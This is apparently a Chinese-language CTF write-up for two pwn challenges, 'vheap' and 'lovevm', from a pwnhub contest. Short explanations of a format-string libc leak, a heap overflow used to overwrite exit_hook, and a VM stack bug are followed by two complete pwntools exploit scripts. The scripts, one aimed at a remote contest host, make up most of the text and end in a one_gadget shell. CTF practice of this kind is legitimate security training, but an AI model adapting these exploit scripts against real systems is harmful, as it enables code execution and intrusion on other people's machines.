---
layout: article
pageview: true
key: 2022-05-14-pwnhub-may-pwn-wp
title: pwnhub五月赛Pwn题WP
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---

<!--more-->
### vheap

公开赛的题目，本人凭此题拿到了pwnhub邀请码，可喜可贺

题目环境为`libc-2.27`，保护全开，有一个格式化字符串漏洞，接下来是处理堆，这部分代码比较抽象，大部分为干扰代码

题目要求我们一次性输入所有指令完成堆处理，最多只能有9条命令，最多只有两个提前写好的数据可以写入堆，漏洞在于每次写入堆时的长度固定为`0x40`，可以进行堆溢出

9次操作不足以进行常规的修改`__free_hook`后执行`system("/bin/sh")`，我们修改`exit_hook`即可

```python
from signal import pause
from pwn import *
context(arch='amd64')
context.log_level='debug'

local = 0
_elf='./vheap'
_libc='./libc-2.27.so'
_addr='121.40.89.206'
_port=33468
elf=ELF(_elf)
def getConn():
    if local ==1:
        return process(_elf)
    else:
        return remote(_addr,_port)

def debug(p,cmd=None):
    if local==1:
        gdb.attach(p,cmd)
    pause()

def add(idx,size):
    cmd=idx+0x100*size+0x1000000*10
    log.info(hex(cmd))
    p.sendline(str(cmd ))

def delete(idx):
    cmd=idx+0x100*12+0x1000000*12
    log.info(hex(cmd))
    p.sendline(str(cmd))

def copy (idx,data_idx):
    cmd=idx+0x10000*data_idx+0x1000000*11
    log.info(hex(cmd))
    p.sendline(str(cmd))


p=getConn()
# debug(p,'b sprintf')

fmtstr=b'%20$p'

p.sendafter(b'name.\n',fmtstr)
p.recvuntil(b'welcome:')
libc=ELF(_libc)
libc_base=int(p.recv(14),16)-libc.sym['__libc_start_main']-231
log.success(hex(libc_base))

ogg=[324261, 324354 ,938831, 939255, 939262, 939266, 1090300, 1090312]
free_hook=libc_base+libc.sym['__free_hook']
system=libc_base+libc.sym['system']
exit_hook=libc_base+0x61b060+3840


p.sendline('2')

data1=b'/bin/sh\x00'+p64(0)+p64(0)+p64(0x21)+p64(exit_hook-0x30)+p64(0)*2+p64(0x21)
data2=b'\0'*0x30+p64(libc_base+ogg[7])*2
p.send(data1.ljust(0x40,b'\0'))
p.send(data2.ljust(0x40,b'\0'))

p.sendlineafter(b'Size:\n',b'9')


add(0,0x10)
add(1,0x10)
add(2,0x10)
delete(2)
delete(1)
copy(0,0)
add(1,0x10)
add(1,0x10)
copy(1,1)


p.interactive()
```

### lovevm

题目环境`libc-2.27`，一道vm题。漏洞在于可以控制栈上数据，虽然没有泄露，但我们将返回地址加上`one_gadget`的偏移即可


```python
from pwn import *
context(arch='amd64')
context.log_level='debug'

local = 1
_elf='./lovevm'
_libc='./libc-2.27.so'
_addr='121.40.89.206'
_port=14116
elf=ELF(_elf)
def getConn():
    if local ==1:
        return process(_elf)
    else:
        return remote(_addr,_port)

def debug(p,cmd=None):
    if local==1:
        gdb.attach(p,cmd)
    pause()

def ptr_target_is_v7():
    return p8(0x59)

def target_is_ptr_v7():
    return p8(0x78)

def v6_is(byte):
    return p8(0x1a)+p8(0x3)+p64(byte)

def v7_is(byte):
    return p8(0x1a)+p8(0x1)+p64(byte)

def v7_multi():
    return p8(0x19)

def v7_empty():
    return p8(0x22)+p8(0x1)+p8(0x1)

def target_empty():
    return p8(0x22)+p8(0x4)+p8(0x4)

def v7_plus_stack():
    return p8(0x11)+p8(0x1)+p8(0x2)

def stack_plus_v7():
    return p8(0x11)+p8(0x2)+p8(0x1)

def target_plus_v7():
    return p8(0x11)+p8(0x4)+p8(0x1)

def v7_plus_target():
    return p8(0x11)+p8(0x1)+p8(0x4)

def v7_plus_v6():
    return p8(0x11)+p8(0x1)+p8(0x3)

def v6_plus_v7():
    return p8(0x11)+p8(0x3)+p8(0x1)

def v6_empty():
    return p8(0x13)+p8(0x3)

p=getConn()
libc=ELF(_libc)

ogg=[324261 ,324354 ,938831,939255, 939262, 939266 ,1090300, 1090312]
offset=[0x2d61e,0x2d67b,0xc36c8,0xc3870,0xc3877,0xc387b,0xe8675,0xe8681]

for i in ogg:
    print(hex(i-libc.sym['__libc_start_main']-231))

pay=b''
pay+=v7_empty()
pay+=v7_is(0x40)
pay+=stack_plus_v7()
pay+=v7_empty()
pay+=v7_plus_stack()
pay+=target_is_ptr_v7()

pay+=v7_empty()
pay+=v7_plus_target()

pay+=v6_empty()
pay+=v6_plus_v7()


pay+=v7_is(0x3)
pay+=v7_multi()
pay+=v7_multi()

pay+=v6_plus_v7()

pay+=v7_is(0xd6)
pay+=v7_multi()

pay+=v6_plus_v7()

pay+=v7_is(0x1e)

pay+=v6_plus_v7()

pay+=v7_empty()

pay+=v7_plus_stack()

pay+=target_empty()

pay+=target_plus_v7()

pay+=v7_empty()
pay+=v7_plus_v6()

pay+=ptr_target_is_v7()


p.sendafter(b'>>\n',pay.ljust(0x60,p8(0x65)))


p.interactive()
```